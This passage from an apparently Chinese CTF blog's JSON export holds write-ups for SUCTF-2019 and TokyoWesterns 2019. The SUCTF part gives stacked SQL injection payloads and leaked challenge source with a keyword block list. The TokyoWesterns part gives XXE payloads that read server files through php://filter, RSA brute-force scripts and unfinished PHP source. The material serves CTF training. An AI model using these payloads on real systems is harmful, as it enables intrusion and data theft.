tables;</code>回显</p>\n<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>测试<code>1;select * from Flag;</code>,flag被过滤了</p>\n<p><code>.index.php.swp</code>存在源码泄露,源码如下  </p>\n<pre><code>&lt;?php\n    session_start();\n\n    include_once &quot;config.php&quot;;\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);\n    if(!$MysqlLink){\n        die(&quot;Mysql Connect Error!&quot;);\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(&quot;Choose Database Error!&quot;);\n    }\n\n    foreach ($_POST as $k=&gt;$v){\n        if(!empty($v)&amp;&amp;is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=&gt;$v){\n        }\n    }\n    //die();\n    ?&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n    if(isset($post[&apos;query&apos;])){\n        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;;\n        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));\n        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){\n            //echo $post[&apos;query&apos;];\n            die(&quot;Nonono.&quot;);\n        }\n        if(strlen($post[&apos;query&apos;])&gt;40){\n            die(&quot;Too long.&quot;);\n        }\n        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?&gt;</code></pre><p>查询语句为：<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>\n<h3 id=\"logical-OR\"><a href=\"#logical-OR\" class=\"headerlink\" title=\"|| logical OR\"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;\n        -&gt; 1\nmysql&gt; SELECT 1 OR 0;\n        -&gt; 1\nmysql&gt; SELECT 0 OR 0;\n        -&gt; 0\nmysql&gt; SELECT 0 OR NULL;\n        -&gt; NULL\nmysql&gt; SELECT 1 OR NULL;\n        -&gt; 1</code></pre><blockquote>\n<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>\n</blockquote>\n<h3 id=\"如何做？\"><a href=\"#如何做？\" class=\"headerlink\" title=\"如何做？\"></a>如何做？</h3><p>先来看一个msql的配置</p>\n<p><strong>PIPES_AS_CONCAT</strong></p>\n<blockquote>\n<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>\n</blockquote>\n<p>如果配置了<code>sql_mode=PIPES_AS_CONCAT</code>，Mysql会把逻辑或当作一个字符串链接函数对待。  </p>\n<p><strong>CONCAT(str1,str2,…)</strong></p>\n<blockquote>\n<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>\n</blockquote>\n<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>\n<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);\n        -&gt; &apos;MySQL&apos;\nmysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);\n        -&gt; NULL\nmysql&gt; SELECT CONCAT(14.3);\n        -&gt; &apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p>\n<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>\n<p>语句为:</p>\n<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id=\"非预期\"><a href=\"#非预期\" class=\"headerlink\" title=\"非预期\"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>\n","text":"SUCTF-2019 WP9/10/2019 6:15:38 PM checkin先上传一个 websell.php，显示后缀不合法(改php5、php4、content-type这些都不行)。再上传一个图片马发现显示 &amp;lt;? in contents! ，就是说&lt","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"TokyoWestern 2019","slug":"TokyoWesterns-2019","date":"2019-09-05T09:20:26.000Z","updated":"2019-09-11T04:43:53.977Z","comments":true,"path":"api/articles/TokyoWesterns-2019.json","excerpt":"","keywords":null,"cover":"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg","content":"<h1 id=\"TokyoWestern-2019\"><a href=\"#TokyoWestern-2019\" class=\"headerlink\" title=\"TokyoWestern 2019\"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM 🎨</p>\n<h2 id=\"ji2xji2\"><a href=\"#ji2xji2\" class=\"headerlink\" title=\"ji2xji2\"></a>ji2xji2</h2><p>拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了<code>failed to decode xml</code>，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;\n&lt;creds&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n&lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;</code></pre><p>就能看出来可以解析，因为觉得不可能这么简单就没有试…</p>\n<p>读源码</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>这里我们要注意得到的加密后的数据在哪里结束</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg\" alt=\"读源码\"></p>\n<p>得到源码，从第一句得到<strong>flag</strong>的位置</p>\n<pre><code>&lt;?php\n**include &apos;flag.php&apos;;**\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n\nfunction die404($msg) {\n  http_response_code(404);\n  die($msg);\n}\n\nfunction check_type($obj) {\n  if (is_array($obj)) {\n    $key_is_str = function($obj) {\n      foreach($obj as $key=&gt;$val) {\n        if (is_int($key))\n          return false;\n      }\n      return true;\n    };\n\n    if ($key_is_str($obj)) {\n      return &apos;object&apos;;\n    }\n    else {\n      return &apos;array&apos;;\n    }\n  }\n  else {\n    return gettype($obj);\n  }\n}\n\nfunction json2xml($obj) {\n  $res = &apos;&apos;;\n\n  if (is_array($obj)) {\n    foreach($obj as $key =&gt; $val) {\n      switch(check_type($val)) {\n        case &apos;array&apos;:\n          foreach($val as $v) {\n            $res .= &quot;&lt;$key&gt;&quot;;\n            $res .= json2xml($v);\n            $res .= &quot;&lt;/$key&gt;&quot;;\n          }\n          break;\n        default: // object or primitive\n          $res .= &quot;&lt;$key&gt;&quot;;\n          $res .= json2xml($val);\n          $res .= &quot;&lt;/$key&gt;&quot;;\n          break;\n      }\n    }\n  }\n  else {\n    $res = (string)$obj;\n  }\n  return $res;\n}\n\n\nif ($method === &apos;POST&apos;) {\n  $jsonstr = $_POST[&apos;json&apos;];\n  $xmlstr = $_POST[&apos;xml&apos;];\n\n  if (!(empty($xmlstr) ^ empty($jsonstr))) {\n    die404(&apos;404&apos;);\n  }\n\n  if (!empty($jsonstr)) {\n    $obj = json_decode($jsonstr, true);\n    if (empty($obj)) {\n      die(&apos;failed to decode json&apos;);\n    }\n    $doc = new DOMDocument(&apos;1.0&apos;);\n    $doc-&gt;formatOutput = true;\n    $_obj = array();\n    $_obj[&apos;root&apos;] = $obj;\n    $doc-&gt;loadXML(json2xml($_obj));\n    echo $doc-&gt;saveXML();\n  }\n\n  if (!empty($xmlstr)) {\n    libxml_disable_entity_loader(false);\n    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);\n    if (empty($obj)) {\n      die(&apos;failed to decode xml&apos;);\n    }\n    echo json_encode($obj, JSON_PRETTY_PRINT);\n  }\n}\nelse {\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;\n    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;\n\n    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;script\n      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;\n      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;\n      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\n    &lt;script&gt;\n      $.get(&apos;/sample.json&apos;, function(data) {\n        $(&apos;#json&apos;).val(data);\n      }, &apos;text&apos;);\n\n      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          json: $(&apos;#json&apos;).val()\n        }, function(data) {\n          $(&apos;#xml&apos;).val(data);\n        });\n      });\n\n      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          xml: $(&apos;#xml&apos;).val()\n        }, function(data) {\n          $(&apos;#json&apos;).val(data);\n        });\n      });\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</code></pre><p>读flag</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>解密即可<br>    {<br>        “message”: “PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK”<br>    }</p>\n<pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id=\"real-baby-rsa\"><a href=\"#real-baby-rsa\" class=\"headerlink\" title=\"real-baby-rsa\"></a>real-baby-rsa</h2><p>告诉了我们N,e以及所有加密后的密文，直接爆破。(做的时候又是那样想的：怎么可能这么简单！(这么简单开始的时候还不知道替换掉换行符，搞了半天没做成😔(；′⌒`)))</p>\n<pre><code>#flag = &apos;TWCTF{CENSORED}&apos;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n\n# Encrypt the flag!\n\n#for i in flag1:\nfor char in flag:\n    print(pow(ord(char), e, N))</code></pre><p>解密脚本：</p>\n<pre><code>import string\n#flag = &apos;TWCTF{CENSORED}&apos;\n\nflag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\ncontent = open(&quot;output&quot;).readlines()\n\nfor line in content:\n    line = line.replace(&apos;\\n&apos;, &apos;&apos;)\n    for char in flag:\n        #print char\n        #print(pow(ord(char), e, N))\n        m = pow(ord(char), e, N)\n        #print(m)\n        #print(line)\n        if str(m) == str(line):\n            #print(m)\n            print(char),\n            break</code></pre><p>再贴一个国外师傅写的，看起来就是比上面的优雅一点😀，别问为什么贴两个？问就是喜欢收集！</p>\n<pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n#create ist ascii char\nlist_ascii = []\nfor i in range(33,126):\n    list_ascii.append(chr(i))\n\n#read each part of cipher text in to list\nlineList = list()\nlineList = [line.rstrip(&apos;\\n&apos;) for line in open(&quot;output&quot;)]\n\n#starting burte force\n\nmesg = &quot;&quot;\n\nfor cir in range(0,len(lineList)):\n    for m in list_ascii:\n        test_str = pow(ord(m),e,N)\n        test_str = str(test_str)\n        if(lineList[cir] in test_str):\n            mesg += m\n            break\nprint(mesg)</code></pre><h2 id=\"php-note\"><a href=\"#php-note\" class=\"headerlink\" title=\"php-note\"></a>php-note</h2><pre><code>first name :1\nlastname: {{2*2}}</code></pre><p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg\" alt=\"登陆成功\"></p>\n<p>查看源码得到hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p>\n<p>读源码</p>\n<pre><code> &lt;?php\ninclude &apos;config.php&apos;;\n\nclass Note {\n    public function __construct($admin) {\n        $this-&gt;notes = array();\n        $this-&gt;isadmin = $admin;\n    }\n\n    public function addnote($title, $body) {\n        array_push($this-&gt;notes, [$title, $body]);\n    }\n\n    public function getnotes() {\n        return $this-&gt;notes;\n    }\n\n    public function getflag() {\n        if ($this-&gt;isadmin === true) {\n            echo FLAG;\n        }\n    }\n}\n\nfunction verify($data, $hmac) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($secret)) return false;\n    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);\n}\n\nfunction hmac($data) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($data) || empty($secret)) return false;\n    return hash_hmac(&apos;sha256&apos;, $data, $secret);\n}\n\nfunction gen_secret($seed) {\n    return md5(SALT . $seed . PEPPER);\n}\n\nfunction is_login() {\n    return !empty($_SESSION[&apos;secret&apos;]);\n}\n\nfunction redirect($action) {\n    header(&quot;Location: /?action=$action&quot;);\n    exit();\n}\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n$action = $_GET[&apos;action&apos;];\n\nif (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;source&apos;) {\n    highlight_file(__FILE__);\n    exit();\n}\n\n\nsession_start();\n\nif (is_login()) {\n    $realname = $_SESSION[&apos;realname&apos;];\n    $nickname = $_SESSION[&apos;nickname&apos;];\n\n    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])\n            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))\n            : new Note(false);\n}\n\nif ($action === &apos;login&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $nickname = (string)$_POST[&apos;nickname&apos;];\n        $realname = (string)$_POST[&apos;realname&apos;];\n\n        if (empty($realname) || strlen($realname) &lt; 8) {\n            die(&apos;invalid name&apos;);\n        }\n\n        $_SESSION[&apos;realname&apos;] = $realname;\n        if (!empty($nickname)) {\n            $_SESSION[&apos;nickname&apos;] = $nickname;\n        }\n        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;logout&apos;) {\n    session_destroy();\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;post&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $title = (string)$_POST[&apos;title&apos;];\n        $body = (string)$_POST[&apos;body&apos;];\n        $note-&gt;addnote($title, $body);\n        $data = base64_encode(serialize($note));\n        setcookie(&apos;note&apos;, (string)$data);\n        setcookie(&apos;hmac&apos;, (string)hmac($data));\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;getflag&apos;) {\n    $note-&gt;getflag();\n}\n\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;PHP note&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        textarea {\n            resize: none;\n            width: 300px;\n            height: 200px;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;?php\n        if (!is_login()) {\n            $realname = htmlspecialchars($realname);\n            $nickname = htmlspecialchars($nickname);\n        ?&gt;\n        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;\n            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;\n            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        } else {\n        ?&gt;\n        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;\n        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;\n        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;?php\n            foreach($note-&gt;getnotes() as $k =&gt; $v) {\n                list($title, $body) = $v;\n                $title = htmlspecialchars($title);\n                $body = htmlspecialchars($body);\n        ?&gt;\n        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;\n        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;\n        &lt;?php\n            }\n        ?&gt;\n        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;\n            &lt;br&gt;\n            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;\n            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        }\n        ?&gt;\n        &lt;?php\n        ?&gt;\n        &lt;script&gt;\n            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {\n                const nickname = document.querySelector(&quot;input#nickname&quot;)\n                const firstname = document.querySelector(&quot;input#firstname&quot;)\n                const lastname = document.querySelector(&quot;input#lastname&quot;)\n                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`\n                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {\n                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()\n                }\n            })\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt; </code></pre><p>没做完，先留坑</p>\n","text":"TokyoWestern 20199/5/2019 5:20:26 PM 🎨ji2xji2拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了failed to decode xml，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的&l","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}]}